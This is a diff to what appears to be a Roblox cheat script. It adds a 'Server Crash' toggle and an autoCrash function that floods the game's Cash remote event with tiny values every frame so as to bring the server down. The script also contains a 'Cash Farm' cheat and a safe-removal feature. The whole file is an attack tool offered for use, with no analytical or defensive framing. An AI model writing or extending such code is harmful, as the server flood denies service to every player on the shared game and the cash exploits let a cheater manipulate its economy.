@@ -1,5 +1,7 @@
 getgenv().autoCash=false
 getgenv().removeSafe=false
+getgenv().dropping=false
+
 
 local Plr = game:GetService("Players").LocalPlayer
 local vu = game:GetService("VirtualUser")
@@ -33,6 +35,17 @@ function removeSafe()
     end)
 end
 
+function autoCrash()
+    spawn(function()
+        while wait() do
+            if not getgenv().dropping then break end
+                for i=1,20 do
+                game:GetService("ReplicatedStorage").Cash:FireServer("0.00000000001")
+            end
+        end
+    end)
+end
+
 local c = game:GetService("Workspace").Vender:GetChildren()
 for i = 1, #c do
     duplicate = i - 1
@@ -59,5 +72,12 @@ tab4.addToggle("Cash Farm", "cashtoggle", "OP cash farm.", false, function(bool)
     getgenv().autoCash = bool
     if bool then
         autoCash()
+    end
+end)
+
+tab4.addToggle("Server Crash", "crashtoggle", "Crash the server.", false, function(bool)
+    getgenv().dropping = bool
+    if bool then
+        autoCrash()
     end
 end)
